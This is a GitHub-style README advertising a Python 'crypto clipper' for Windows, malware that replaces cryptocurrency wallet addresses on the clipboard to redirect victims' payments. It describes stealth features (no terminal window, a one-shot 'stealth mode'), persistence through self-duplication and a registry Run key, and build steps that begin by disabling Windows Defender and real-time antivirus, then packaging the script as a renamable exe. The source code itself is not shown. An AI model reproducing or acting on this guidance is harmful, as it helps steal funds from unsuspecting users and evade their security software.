# crypto clipper - USE MAIN.PYW AS EXE FOR STEALTH AS IT DOESNT HAVE TERMINAL (NO ONE WILL KNOW ITS RUNNING)
**BTC, ETH, LTC, XMR clipper written in python using no external packages. ONLY WORKS ON WINDOWS**
---
**Features**
- Supports Bitcoin, Ethereum, Litecoin, Monero
- Has a single use option. (Will only ever clip once and then never again, kind of like a stealth mode)
- Works as .exe
- Duplicates and adds to startup with registry
- Uses powershell to read and set clipboard
- Has an uninstaller
---
How to make into .exe
```console
# Turn of windows defender

# pip install pyinstaller

# pyinstaller --onefile main.pyw

# when .exe is ran it will duplicate, add to startup and monitor clipboard. You can rename and change icon of the exe. 

# if computer is turned on and off/restarted the program will run as the task "clppth.exe".
```
---
**The .exe may need to be run with realtime protection off on antivirus**
---
**For manual uninstall**
- Windows key + r
- %appdata%
- Delete folder Storage0 and folder CLPPTH
- Goto registry editor
- Goto Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
- Delete entry CLPPTH
---
**Example of usage - sorry for low res video - github shitty 10mb max video upload**
https://github.com/3022-2/crypto-clipper/assets/82278708/9bfbd0a6-e0e6-41e1-84fa-50aa55f9d813

